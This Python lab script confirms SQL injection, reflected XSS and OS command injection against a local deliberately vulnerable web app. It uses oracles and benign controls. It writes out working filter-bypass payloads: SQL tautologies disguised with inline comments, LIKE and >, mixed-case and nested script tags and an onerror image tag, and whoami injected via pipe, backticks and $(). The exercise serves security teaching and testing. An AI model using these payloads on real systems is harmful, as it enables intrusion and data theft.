"""Part A — three oracle-confirmed vulnerabilities on `vuln-web`, each with a
built-in-filter bypass.  Run:  python3 confirm_attacks.py

Discipline (seclab.attack): a finding is CONFIRMED only when a SOUND ORACLE sees a
security-relevant EFFECT, reproducibly (trials=3) — never "the response looked
right". Each class also carries a benign CONTROL that must confirm 0/3: a false
positive in our own tooling would poison every number downstream.

The "Medium filter" each payload must bypass (Part A requirement):
  * SQLi  — the Part-B1 WAF blocklist (negative model). `vuln-web`'s sink is a
            *string* context, so quote-escaping would actually fix it (that is a
            Part-B2 point); the only *bypassable* filter for this class is a
            blocklist, which is exactly what we then measure in Part B1.
  * XSS   — DVWA-Medium `str_replace('<script>','')`; bypassed by case / `<img>`.
  * cmdi  — DVWA-Medium blacklist of `&&` and `;`; bypassed by `|` / `` ` `` / `$()`.

Writes evidence to attack/evidence.json and attack/findings.csv.
"""

from __future__ import annotations

import csv
import json
import re
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))          # the vaca/ package dir

import _common as C                            # noqa: E402
from medium_filter import xss_medium, cmdi_medium  # noqa: E402
from defend.waf_blocklist import waf_block     # noqa: E402

from seclab.attack import Payload, run_payloads, contains_oracle, print_summary  # noqa: E402

TRIALS = 3


# --- sound oracles -----------------------------------------------------------
# SQLi: a canary leak is proof of extraction (not that login "behaved differently").
sqli_oracle = contains_oracle(C.canary())


_ACTIVE_TAG = re.compile(r"<\s*script", re.I)
_ACTIVE_HANDLER = re.compile(r"<\s*(img|svg)\b[^>]*\bon\w+\s*=", re.I)


def xss_oracle(payload: Payload, response: str):
    """Sound necessary condition: an executable tag survives UNESCAPED in the
    HTML — a `<script>` (any case), or an `<img>/<svg>` carrying an `on*` handler.
    Reflection is not execution, but un-encoded active markup is the exploitable
    precondition. If the angle brackets were entity-encoded (`&lt;`) with no raw
    `<script`, the sink is safe and we must NOT confirm (true negative)."""
    if _ACTIVE_TAG.search(response) or _ACTIVE_HANDLER.search(response):
        return True, "unescaped active markup reflected to the browser"
    return False, ""


def cmdi_oracle(payload: Payload, response: str):
    """Sound condition: the app reports injection_detected — a shell metacharacter
    from our input reached the command context (do_ping simulates execution)."""
    try:
        detected = json.loads(response).get("injection_detected") is True
    except (json.JSONDecodeError, AttributeError):
        detected = False
    return detected, ("shell metacharacter reached the command" if detected else "")


# --- senders that pass input THROUGH the Medium filter first -----------------
def sqli_send(text: str) -> str:
    # The negative "Medium filter" for SQLi is the WAF blocklist. A blocked
    # payload never reaches the sink; we mark it so the oracle fails honestly.
    if waf_block(text):
        return json.dumps({"blocked_by_waf": waf_block(text)})
    return C.login_send(text)


def xss_send(text: str) -> str:
    return C.reflect_send(xss_medium(text))


def cmdi_send(text: str) -> str:
    return C.ping_send(cmdi_medium(text))


def main() -> int:
    C.start_vulnweb()

    # ---- SQLi @ do_login : OWASP A03:2021 Injection -------------------------
    # Raw tautology `' OR '1'='1` is CAUGHT by the blocklist (SQLi string
    # tautology / quote-OR opener). The bypasses are same-intent mutations that
    # evade the rules yet still leak the admin canary.
    # The working technique needs no trailing `-- ` comment: the value ends in a
    # quote-balanced token so the template's own trailing `'` closes the string,
    # and operator precedence (AND binds tighter than OR) makes `pw` irrelevant.
    #   WHERE user = 'admin' OR '1'='1' AND pw = 'x'
    #   == user='admin' OR ('1'='1' AND pw='x') == admin-row (canary leaks)
    sqli_payloads = [
        Payload("admin' OR '1'='1", "raw string tautology (blocklist catches it)", "sqli"),
        Payload("admin'/**/OR/**/'1'='1", "inline-comment spacing defeats whitespace-anchored rules", "sqli"),
        Payload("admin'/**/OR/**/'1'LIKE'1", "LIKE instead of = evades the tautology rules", "sqli"),
        Payload("admin'/**/OR/**/'1'>'0", "comparison operator > evades the = rules", "sqli"),
    ]
    sqli = run_payloads(sqli_payloads, send=sqli_send, oracle=sqli_oracle,
                        trials=TRIALS, progress=True)

    # Benign control: a real user + correct creds must NOT leak the canary via
    # our oracle on a NON-injection login. (admin/s3cr3t returns the row incl.
    # secret — that is legitimate auth, so we test a wrong-password normal login.)
    control = run_payloads(
        [Payload("alice", "benign username, correct password, no injection", "sqli-control")],
        send=lambda t: C.login_send(t, pw="password"), oracle=sqli_oracle, trials=TRIALS)
    # alice's row secret is "ordinary-row", not the canary, so oracle must be 0/3.

    # ---- XSS @ do_reflect : OWASP A03:2021 Injection (XSS) ------------------
    xss_payloads = [
        Payload("<script>alert(1)</script>", "raw <script> (Medium filter strips it)", "xss"),
        Payload("<ScRiPt>alert(1)</ScRiPt>", "case bypass: filter strips only lowercase <script>", "xss"),
        Payload("<img src=x onerror=alert(1)>", "no <script> tag at all (onerror handler)", "xss"),
        Payload("<scr<script>ipt>alert(1)</script>", "nested tag: one str_replace leaves a real <script>", "xss"),
    ]
    xss = run_payloads(xss_payloads, send=xss_send, oracle=xss_oracle,
                       trials=TRIALS, progress=True)
    # True-negative carried into the duel: the fixed /safe endpoint must NOT confirm.
    safe_tn = run_payloads(
        [Payload("<script>alert(1)</script>", "same payload at the FIXED /safe sink", "xss-true-negative")],
        send=lambda t: C.reflect_send(t, safe=True), oracle=xss_oracle, trials=TRIALS)

    # ---- cmdi @ do_ping : OWASP A03:2021 Injection (OS command) -------------
    cmdi_payloads = [
        Payload("127.0.0.1; whoami", "raw `;` separator (Medium filter strips it)", "cmdi"),
        Payload("127.0.0.1 | whoami", "pipe separator, not on the blacklist", "cmdi"),
        Payload("127.0.0.1 `whoami`", "backtick command substitution", "cmdi"),
        Payload("127.0.0.1 $(whoami)", "$() command substitution", "cmdi"),
    ]
    cmdi = run_payloads(cmdi_payloads, send=cmdi_send, oracle=cmdi_oracle,
                        trials=TRIALS, progress=True)
    cmdi_control = run_payloads(
        [Payload("example.com", "benign host, no metacharacter", "cmdi-control")],
        send=cmdi_send, oracle=cmdi_oracle, trials=TRIALS)

    # ---- report -------------------------------------------------------------
    print("\n=== Part A summary (oracle-confirmed, trials=%d) ===" % TRIALS)
    for label, fs in [("SQLi", sqli), ("XSS", xss), ("cmdi", cmdi)]:
        print(f"\n-- {label} --")
        print_summary(fs)
    print("\n-- controls / true-negatives (MUST be 0/3) --")
    for label, fs in [("SQLi benign login", control),
                      ("XSS /safe endpoint", safe_tn),
                      ("cmdi benign host", cmdi_control)]:
        c = sum(f.confirmed for f in fs)
        flag = "OK" if c == 0 else "!! FALSE POSITIVE"
        print(f"  [{flag}] {label}: {c}/{TRIALS} confirmed")

    # ---- persist evidence ---------------------------------------------------
    all_findings = []
    rows = []
    for cls, fs in [("sqli", sqli), ("xss", xss), ("cmdi", cmdi)]:
        for f in fs:
            waf = waf_block(f.payload.text) if cls == "sqli" else None
            rec = {
                "class": cls, "owasp": "A03:2021-Injection",
                "payload": f.payload.text, "bypass_note": f.payload.intent,
                "confirmed": f.confirmed, "successes": f.successes,
                "trials": f.trials, "reliability": round(f.reliability, 3),
                "deterministic": f.deterministic,
                "evidence": f.evidence,
                "medium_filter_blocked": bool(waf),
                "medium_filter_rule": waf,
            }
            all_findings.append(rec)
            rows.append(rec)

    (HERE / "evidence.json").write_text(json.dumps({
        "target": "vuln-web (labs/vuln-web/app/vulnweb_app.py), in-process on 127.0.0.1",
        "trials": TRIALS,
        "canary": C.canary(),
        "findings": all_findings,
        "controls": {
            "sqli_benign_login_confirmed": sum(f.confirmed for f in control),
            "xss_safe_endpoint_confirmed": sum(f.confirmed for f in safe_tn),
            "cmdi_benign_host_confirmed": sum(f.confirmed for f in cmdi_control),
        },
    }, indent=2))

    with (HERE / "findings.csv").open("w", newline="") as fh:
        w = csv.DictWriter(fh, fieldnames=list(rows[0].keys()))
        w.writeheader()
        w.writerows(rows)

    # Full marks require each class oracle-confirmed via a payload that BYPASSES
    # the filter (i.e. one that is not the raw/blocked variant), controls clean.
    def confirmed_bypass(findings):
        return any(f.confirmed and not f.payload.intent.startswith("raw")
                   for f in findings)

    ok = (confirmed_bypass(sqli) and confirmed_bypass(xss) and confirmed_bypass(cmdi)
          and sum(f.confirmed for f in control) == 0
          and sum(f.confirmed for f in safe_tn) == 0
          and sum(f.confirmed for f in cmdi_control) == 0)
    print("\n" + ("PART A SOUND — 3 classes confirmed past a filter bypass, controls clean."
                  if ok else "PART A PROBLEM — inspect above."))
    print("evidence → attack/evidence.json , attack/findings.csv")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
